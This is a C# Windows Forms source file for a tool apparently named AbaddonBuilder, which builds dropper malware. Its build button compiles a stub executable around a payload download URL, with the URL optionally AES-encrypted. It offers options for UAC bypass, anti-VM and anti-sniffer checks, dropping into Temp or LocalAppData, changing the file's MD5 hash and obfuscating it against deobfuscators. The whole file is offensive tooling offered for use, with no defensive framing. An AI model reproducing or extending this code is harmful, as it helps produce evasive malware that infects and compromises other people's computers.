using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using dnlib.DotNet;
using System.Windows.Forms;
using dnlib.DotNet.Writer;
using System.ComponentModel;
using AbaddonBuilder.Core.Protections;
using AbaddonBuilder.Core.Protections.AddRandoms;

namespace AbaddonBuilder
{
    public partial class Form1 : Form
    {
        public static MethodDef Init;
        public static MethodDef Init2;
        public string DirectoryName = string.Empty;
        public static string iv = "rtuoglkifgerdnuh";
        public static string key;

        public Form1()
        {
            InitializeComponent();
        }

        private void label3_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void label8_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            key = KeyText.Text;
            Extract.Extractor.Extract("AbaddonBuilder", Path.GetTempPath(), "Stub", "AbaddonStub.exe");
            string path = "";
            string PayloadUrl;
            string Enc = "";
            string UacBypass = UacBypassCheck.Checked.ToString();
            string AntiVm = AntiVmCheck.Checked.ToString();
            string AntiWebSniffer = AntiWebSnifferCheck.Checked.ToString();
            string Temp = TempPathCheck.Checked.ToString();
            string LAppdata = LAppdataCheck.Checked.ToString();
            if (Temp == "True") { path = "Temp"; }
            if (LAppdata == "True") { path = "Local"; }
            if (EncryptionCheck.Checked) { PayloadUrl = RunEncryption(guna2TextBox1.Text); } else { PayloadUrl = guna2TextBox1.Text; }
            if (EncryptionCheck.Checked) { Enc = "True"; } else { Enc = "False"; }
            string text = DropText.Text;
            bool exe = text.EndsWith(".exe");
            if (exe)
            {
                Compiler.Compile.CreateExe(text, PayloadUrl, AntiVm, AntiWebSniffer, path, Enc, UacBypass, guna2TextBox2.Text, key);
                if (MD5CHECK.Checked)
                {
                    String[] MD5Fname = new String[] { text };
                    ChangeMD5.MD5HASH.changeMD5(MD5Fname);
                }
                if (ObfuscateCheck.Checked)
                {
                    ModuleDefMD module = ModuleDefMD.Load(text);
                    Execute(module);
                    Protection.LocalF.L2FV2.Execute(module);
                    Protection.INT.AddIntPhase.Execute2(module);
                    Protection.Proxy.ProxyString.Execute(module);
                    NoMoreDe4Dot.De4dot.Execute(module);
                    module.Write($"Protected_{text}");
                }
            }
            else
            {
                Compiler.Compile.CreateExe(text + ".exe", PayloadUrl, AntiVm, AntiWebSniffer, path, Enc, UacBypass, guna2TextBox2.Text, key);
                if (MD5CHECK.Checked)
                {
                    String[] MD5Fname = new String[] { text + ".exe" };
                    ChangeMD5.MD5HASH.changeMD5(MD5Fname);
                }
                if (ObfuscateCheck.Checked)
                {
                    ModuleDefMD module = ModuleDefMD.Load(text);
                    Execute(module);
                    Protection.LocalF.L2FV2.Execute(module);
                    Protection.INT.AddIntPhase.Execute2(module);
                    Protection.Proxy.ProxyString.Execute(module);
                    NoMoreDe4Dot.De4dot.Execute(module);
                    module.Write($"Protected_{text}.exe");
                }
            }



        }
        private static void Execute(ModuleDefMD module)
        {
            Renamer.Execute(module: module);
            RandomOutlinedMethods.Execute(module: module);
        }

        public AesCryptoServiceProvider GetAes()
        {
            var aes = new AesCryptoServiceProvider();
            aes.BlockSize = 128;
            aes.KeySize = 256;
            aes.Key = Encoding.ASCII.GetBytes(Form1.key);
            aes.IV = Encoding.ASCII.GetBytes(Form1.iv);
            aes.Padding = PaddingMode.PKCS7;
            aes.Mode = CipherMode.CBC;

            return aes;
        }

        public string RunEncryption(string text)
        {
            byte[] texts = Encoding.ASCII.GetBytes(text);
            var encdec = GetAes();

            ICryptoTransform icrypt = encdec.CreateEncryptor(encdec.Key, encdec.IV);
            byte[] enc = icrypt.TransformFinalBlock(texts, 0, texts.Length);
            icrypt.Dispose();
            return Convert.ToBase64String(enc);
        }

        private void TempPathCheck_Click(object sender, EventArgs e)
        {
            LAppdataCheck.Checked = false;
        }

        private void LAppdataCheck_Click(object sender, EventArgs e)
        {
            TempPathCheck.Checked = false;
        }

        private void KeyText_TextChanged(object sender, EventArgs e)
        {

        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
            int length = 32;
            StringBuilder str_build = new StringBuilder();
            Random random = new Random();

            char letter;

            for (int i = 0; i < length; i++)
            {
                double flt = random.NextDouble();
                int shift = Convert.ToInt32(Math.Floor(25 * flt));
                letter = Convert.ToChar(shift + 65);
                str_build.Append(letter);
            }
            KeyText.Text = str_build.ToString();

        }




        public struct Values
        {
            public static string Uacc;
            public static string AntiVmm;
            public static string AntiWebsnifferr;
            public static string Pathh;
            public static string Encryptt;
        }
        public class Context
        {
            public AssemblyDef Assembly;
            public ModuleDef ManifestModule;
            public TypeDef GlobalType;
            public Importer Imp;
            public MethodDef cctor;

            public Context(AssemblyDef asm)
            {
                Assembly = asm;
                ManifestModule = asm.ManifestModule;
                GlobalType = ManifestModule.GlobalType;
                Imp = new Importer(ManifestModule);
                cctor = GlobalType.FindOrCreateStaticConstructor();
            }
        }
    }
}
